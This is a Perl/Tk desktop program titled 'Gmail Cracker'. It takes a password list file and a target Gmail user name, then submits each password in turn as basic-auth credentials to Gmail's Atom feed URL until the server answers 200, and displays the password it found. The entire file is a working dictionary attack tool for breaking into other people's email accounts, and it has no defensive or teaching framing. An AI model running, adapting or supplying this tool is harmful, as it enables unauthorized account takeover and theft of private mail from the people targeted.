#!/usr/bin/perl

#use strict;
use warnings;

use Tk;
use WWW::Curl::Easy;

require Tk::Table;
require Tk::FileSelect;

my($UserName, $Password, $Site, $CurlReturn, $File, $Pane,
	$ResponseCode, $Curl, $Path, $Yada );

my(@ARG, @Curl, @LogFile);

my $MainWindow = MainWindow->new;
	$MainWindow->title( 'Gmail Cracker' );
	$MainWindow->geometry( '600x400+50+50' );

my $Table = $MainWindow->Table( -rows => 10,
				-columns => 10,
				-scrollbars => 0,
				);

########################################################################
##                       PASSWORD LIST FUNCTIONS                      ##
########################################################################

my $ListLabel = $Table->Label( -text => 'LIST: ' );      
	$Table->put(1,1, $ListLabel);

my $ListEntry = $Table->Entry( -background => 'WHITE', -width => '40', );
	$Table->put(1,2, $ListEntry);

my $ListButton = $Table->Button( -text => "Get List",
        -command => \&choose_dir );
	$Table->put(1,9, $ListButton);

########################################################################
##                       USERNAME FUNCTIONS                           ##
########################################################################

my $UserLabel = $Table->Label( -text => 'USER NAME: ' );
        $Table->put(3,1, $UserLabel);

my $UserEntry = $Table->Entry( -background => 'WHITE', -width => '50', );
        $Table->put(3,2, $UserEntry);

## ----------------------------------------------------------------------
my $ConnectButton = $Table->Button( -text => "Start Crackn", -command => \&Crackn );
        $Table->put(3,9, $ConnectButton);

## SCROLLED WIDGET ------------------------------------------------------
	$Pane = $MainWindow->Scrolled( "Text", Name => 'Display',
                                   -scrollbars => 'e',
                                   -relief => "sunken",
                                   -foreground => 'blue',
                                   -background => "WHITE" )->pack( -side => 'bottom', -anchor => 's');

## PACK TABLE AS SEPERATE CALL. CANNOT PACK DIRECTLT WITH WIDGET OR IT WILL FAIL.
$Table->pack();

MainLoop;

sub choose_dir {
			
my $FileSelector = $MainWindow->FileSelect( -directory => '/' );

	$File = $FileSelector->Show; 

	if($File) {
	
		$Pane->insert("end", "\nThis is not a list file. Please chose a file with a .list extension.\n");

		if( &path_check ) {	
	
			$Pane->insert("end", "\nDictionary Path => $File\n");

			$ListEntry->insert("end", $File);

		}

			else {

				&warning;

			}

	}

		else {

			print "\nFALSE\n";

		}

	## THIS LINE AND THE ONE UNDER SETS THE FILE NAME EXCLUDING THE PATH TO THE $PATHFILE VARIABLE
	
};

sub Crackn { 

$Yada = $ListEntry->get;

	if( $Yada eq '' ) {

		print "File not selected\n";

		$Pane->insert("end", "\nFile not selected.\n");

	}

		elsif( ! $File ) {

			$File = $Yada;

			if( &path_check ) {

				$Pane->insert("end", "\nDictionary Path => $File\n");

			}

		}



$UserName = $UserEntry->get;
$MainWindow->update;

	if($UserName eq '') {
		print "\nEmpty user Name.\n";
		&empty_uname;
		return;
	}


$Pane->insert("end", "\nGmail User Name => $UserName\n");
$MainWindow->update;

$Pane->insert("end", "\n\nCracking, please wait.\n\n");
$MainWindow->update;

open(FILE, '<', $File) or die "Cannot open $File: $!\n";

        $Site = 'https://mail.google.com/mail/feed/atom';

        $Curl = WWW::Curl::Easy->new;

while(<FILE>) {

	#last unless defined $_;

        $Curl->setopt(CURLOPT_TIMEOUT, 20);

        $Curl->setopt(CURLOPT_CONNECTTIMEOUT, 15);

        $Curl->setopt(CURLOPT_VERBOSE, 1);

        #$Curl->setopt(CURLOPT_HEADER, 1);

        $Curl->setopt(CURLOPT_USERPWD, "$UserName:$_");

        $Curl->setopt(CURLOPT_URL, $Site);
 
        $CurlReturn = $Curl->perform;

        $ResponseCode = $Curl->getinfo(CURLINFO_HTTP_CODE);

        if( $ResponseCode == 200 ) {

		$Pane->insert("end", "\nPASSWORD WAS => $_\n");

                print "\n\nPASSWORD WAS $_\n\n";

                return;

        }

                else {

                	print "\n\nPASSWORD WAS NOT $_\n\n";

                }

 }

}

sub warning {
my $Tlw = $MainWindow->Toplevel;
	$Tlw->geometry("260x100+50+50");
	$Tlw->title('Warning');

my $Label = $Tlw->Label( -text => "This is not a .list file. Please \nchose a file with the .list extension." )->pack( -side => 'top', 
		-pady => '15' );

	$Tlw->Button( -text => "OK",
			-command => sub { $Tlw->withdraw }, )->pack( -side => 'bottom', 
					-anchor => 'se', 
					-padx => '5', 
					-pady => '5' );
};

sub path_check {

if( $File =~ m/\/[a-zA-Z0-9].*\/+/i ) {
 
                my $PathFile = $';

		## CHECKS TO SEE IF FILE ENDS WITH .LIST EXTENSION.
                if( $PathFile =~ m/[a-zA-Z0-9]*\.list/i ) {

                        #print $PathFile;

			$ListEntry->insert("end", "$File");

			$Pane->insert("end", "Dictionary Path => $File\n");
			

                }

			else {

				&warning;

				print "\nNot a list file.\n";

			}


        }	

}

sub empty_uname {
my $Tlw = $MainWindow->Toplevel;
	$Tlw->geometry("260x100+50+50");
	$Tlw->title('Warning');

my $Label = $Tlw->Label( -text => "User Name is empty. Please \nprovide a user name." )->pack( -side => 'top', 
		-pady => '15' );

	$Tlw->Button( -text => "OK",
			-command => sub { $Tlw->withdraw }, )->pack( -side => 'bottom', 
					-anchor => 'se', 
					-padx => '5', 
					-pady => '5' );
};
